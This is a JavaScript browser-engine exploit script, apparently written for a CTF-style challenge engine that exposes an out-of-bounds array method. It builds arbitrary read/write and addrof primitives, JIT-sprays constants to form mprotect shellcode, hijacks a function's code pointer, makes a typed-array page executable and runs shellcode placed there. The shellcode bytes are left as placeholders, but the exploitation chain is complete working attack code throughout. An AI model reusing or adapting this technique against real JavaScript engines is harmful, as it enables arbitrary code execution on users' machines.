
////////////////////////////////////////////////////////////////////////////////
// Step 1: Get arb RW
function w64(addr, val) {
    // Found this offset by just dumping some pointers OOB,
    // and looking for 0x4141414141414141 in gdb.
    //
    // redefining x/y each time avoids GC bullshittery
    let x = new Array(1.1, 2.2)
    let y = new BigInt64Array(1);
    // y[0] = 0x4141414141414141n;
    x.oob(9, itod(addr));
    y[0] = val;
}

function r64(addr) {
    let x = new Array(1.1, 2.2)
    let y = new BigInt64Array(1);
    x.oob(9, itod(addr));
    return y[0];
}

function addrof(obj) {
    let x = new Array(1.1, 2.2)
    let y = new BigInt64Array(1);
    x.oob(10, obj);
    return y[0] & 0xffffffffffffn;
}

////////////////////////////////////////////////////////////////////////////////
// Step 2: stage some shellcode
var shellcode = [
   /* SHELLCODE_GOES_HERE */ 
];

var page = new Uint8Array(0x1000);
var pPage = addrof(page);
log("page @ " + hex(pPage));
var pBackingPage = pPage + 0x30n;
var backingPage = r64(pBackingPage);
log(`BackingPage: ${hex(pBackingPage)} -> ${hex(backingPage)}`);


// JIT spray some constants to make up mprotect(x, 0x1000, 7) shellcode
const jitme = (x) => [/* MPROTECTOR_GOES_HERE */];
const egg1 = jitme(1.1)[0];
const egg2 = jitme(1.1)[1];

for (let i = 0; i < 100000; i++) {
    jitme(1.1);
}

var pJitMe = addrof(jitme);
console.log("jitme: " + hex(pJitMe));

var pppCode = pJitMe + 0x28n;
var ppCode = r64(pppCode);
var pCode = r64(ppCode);
log(`Code: ${hex(pppCode)} -> ${hex(ppCode)} -> ${hex(pCode)}`);

var start = pCode;
start = start & 0xfffffffffffff000n;
var pJitCode = egghunt(start, start + 0x5000n, egg1, egg2);
if (pJitCode == -1) {
    log("Failed to find JIT code");
} else {
    pJitCode = pJitCode + 0x10n;
    log(`JITCode: ${hex(pJitCode)}`);
    // Move the function pointer to the JIT'ed mprotect shellcode
    w64(ppCode, pJitCode);

    // mprotect the backingPage
    jitme(itod(backingPage));

    // Copy the shellcode to the backing page
    for (var i = 0; i < shellcode.length; i++) {
        page[i] = shellcode[i];
    }

    // Trigger the shellcode
    w64(ppCode, backingPage)

    jitme(itod(0x1122334455667788n));
}
